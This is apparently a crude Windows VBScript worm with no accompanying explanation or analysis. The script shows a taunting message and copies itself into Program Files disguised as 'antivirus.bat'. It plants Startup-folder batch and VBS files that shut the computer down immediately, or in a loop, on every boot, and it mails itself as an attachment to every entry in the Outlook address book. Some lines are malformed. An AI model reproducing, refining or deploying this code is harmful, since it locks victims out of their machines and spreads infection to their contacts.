msgbox "HAhaHA YOUR FUCKED"
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Program 

Files\antivirus.bat", True
Set ANTI = CreateObject("Scripting.FileSystemObject")
Set NOTEPAD = anti.CreateTextFile("C:\ASS.TXT")
Set NOTEPAD = anti.CreateTextFile("C:\PROGRAM FILES/fuckass.txt")
NOTEPAD.writeline "heyassfucker "
NOTEPAD.writeline "fucker"
NOTEPAD.Writeline "exit"
NOTEPAD.close

Set anti = CreateObject("Scripting.FileSystemObject")
Set batch = anti.CreateTextFile("C:\WINDOWS\antivirus.bat")
set batch = anti.createtextfile("C:\Documents and Settings\All 

Users\Start Menu\Programs/startup/antivirus.bat")
batch.writeline "SHUTDOWN -S -T 0 "
batch.writeline "START C:\WINDOWS\antivirus.bat"
batch.Writeline "copy 0% C:\Documents and Settings\All Users\Start 

Menu\Programs\Startup/fucker.vbs"
batch.Close

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\fucker.vbs", 

True
Set ANTI = CreateObject("Scripting.FileSystemObject")
Set NOTEPAD = anti.CreateTextFile("C:\fucker.vbs")
Set NOTEPAD = anti.CreateTextFile("C:\Documents and Settings\All 

Users\Start Menu\Programs/startup/fucker.vbs")
NOTEPAD.writeline "do "
NOTEPAD.writeline "start %windir%\System32\SHUTDOWN.exe -s -t 01"
NOTEPAD.Writeline "loop"
NOTEPAD.writeline "end"




Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Subject" 
Mail.Body="Body" 
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send 
Next 
ol.Quit 